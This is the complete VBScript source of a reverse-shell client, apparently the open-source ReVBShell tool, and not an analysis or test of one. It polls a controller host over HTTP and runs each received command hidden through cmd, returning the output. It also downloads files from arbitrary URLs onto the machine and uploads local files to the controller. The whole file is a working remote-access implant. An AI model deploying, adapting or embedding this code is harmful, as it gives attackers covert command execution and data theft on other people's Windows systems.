' this software is provided under under the bsd 3-clause license.
' See the accompanying LICENSE file for more information.
'
' Client for Reverse VBS Shell
'
' Author:
'  Arris Huijgen
'
' Website:
'  https://github.com/bitsadmin/ReVBShell
'

Option Explicit
' General
Dim strResponse, arrResponseText, strRawCommand, strCommand, strArgument, strPostResponse
' Configuration
Dim strHost, strPort, strUrl
' SLEEP
Dim intSleep
' SHELL
Dim fs, shell, strOutFile, file, text
' WGET
Dim arrSplitUrl, strFilename, http, stream
' GET
Dim binFileContents

' Instantiate objects
Set shell = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")

' Configuration
strHost = "127.0.0.1"
strPort = "8080"
intSleep = 5000
strUrl = "http://" & strHost & ":" & strPort

' Periodically poll for commands
While True
    ' Fetch next command
    http.Open "GET", strUrl & "/", False
    http.Send
    strRawCommand = http.ResponseText
    arrResponseText = Split(strRawCommand, " ", 2)

    ' Determine command and arguments
    strCommand = arrResponseText(0)
    strArgument = ""
    If UBound(arrResponseText) > 0 Then
        strArgument = arrResponseText(1)
    End If

    strResponse = ""

    ' Execute command
    Select Case strCommand
        ' Sleep X seconds
        Case "NOOP"
            WScript.Sleep intSleep
        
        ' Set sleep time
        Case "SLEEP"
            intSleep = CInt(strArgument)
            strResponse = "Sleep set to " & strArgument & "ms"
            SendStatusUpdate
        
        ' Execute command
        Case "SHELL"
            'Execute and write to file
            strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
            shell.Run "cmd /C " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True

            ' Read out file
            Set file = fs.OpenTextFile(strOutfile, 1)
            text = file.ReadAll
            file.Close
            fs.DeleteFile strOutFile, True

            ' Set response
            strResponse = "--------------------------------------------------" & vbCrLf & text & "--------------------------------------------------"
            SendStatusUpdate

        ' Download a file from a URL
        Case "WGET"
            ' Determine filename
            arrSplitUrl = Split(strArgument, "/")
            strFilename = arrSplitUrl(UBound(arrSplitUrl))

            ' Fetch file
            http.Open "GET", strArgument, False
            http.Send

            ' Write to file
            Set stream = createobject("Adodb.Stream")
            stream.Type = 1
            stream.Open
            stream.Write http.ResponseBody
            stream.SaveToFile strFilename, 2
            stream.Close

            ' Set response
            strResponse = "File download successful."
            SendStatusUpdate

        Case "GET"
            ' Only download if file exists
            If fs.FileExists(strArgument) Then
                ' Determine filename
                arrSplitUrl = Split(strArgument, "\")
                strFilename = arrSplitUrl(UBound(arrSplitUrl))

                ' Read the file to memory
                Set stream = CreateObject("Adodb.Stream")
                stream.Type = 1 ' adTypeBinary
                stream.Open
                stream.LoadFromFile strArgument
                binFileContents = stream.Read

                DoHttpBinaryPost strFilename, binFileContents
            Else
                strResponse = "File does not exist: " & strArgument
                SendStatusUpdate
            End If
        Case "KILL"
            strResponse = "Goodbye!"
            SendStatusUpdate
            WScript.Quit 0

        Case Else
            strResponse = "Unknown command"
            SendStatusUpdate
    End Select
Wend


Function SendStatusUpdate()
    strPostResponse = vbCrLf & "> " & strRawCommand & vbCrLf & strResponse & vbCrLf
    DoHttpPost strPostResponse
End Function


Function DoHttpPost(strData)
    http.Open "POST", strUrl & "/", False
    http.Send "result=" & strData
    DoHttpPost = http.ResponseText
End Function


Function DoHttpBinaryPost(strFilename, binData)
    ' Compile POST headers and footers
    Const strBoundary = "----WebKitFormBoundaryNiV6OvjHXJPrEdnb"
    Dim binHeader, binFooter, binConcatenated
    binHeader = StringToBinary(vbCrLf & _
                               "--" & strBoundary & vbCrLf & _ 
                               "Content-Disposition: form-data; name=""upfile""; filename=""" & strFilename & """" & vbCrLf & _
                               "Content-Type: application/octet-stream" & vbCrLf & vbCrLf)
    binFooter = StringToBinary(vbCrLf & vbCrLf & "--" & strBoundary & "--" & vbCrLf)

    ' Concatenate headers, data and footers
    Dim oStream : Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1 ' adTypeBinary
    oStream.Write binHeader
    oStream.Write binData
    oStream.Write binFooter
    oStream.Position = 0
    binConcatenated = oStream.Read(LenB(binHeader) + LenB(binData) + LenB(binFooter))

    ' Post data
    http.Open "POST", strUrl & "/", False
    http.SetRequestHeader "Content-Length", LenB(binConcatenated)
    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary
    http.SetTimeouts 5000, 60000, 60000, 60000
    http.Send binConcatenated
    
    ' Receive response
    DoHttpBinaryPost = http.ResponseText
End Function


Function StringToBinary(Text)
    Dim BinaryStream
    Set BinaryStream = CreateObject("Adodb.Stream")
    BinaryStream.Type = 2 'adTypeText
    BinaryStream.CharSet = "us-ascii"

    ' Store text in stream
    BinaryStream.Open
    BinaryStream.WriteText Text

    ' Change stream type To binary
    BinaryStream.Position = 0
    BinaryStream.Type = 1 'adTypeBinary
  
    ' Ignore first two bytes
    BinaryStream.Position = 2
  
    ' Return binary data
    StringToBinary = BinaryStream.Read
End Function
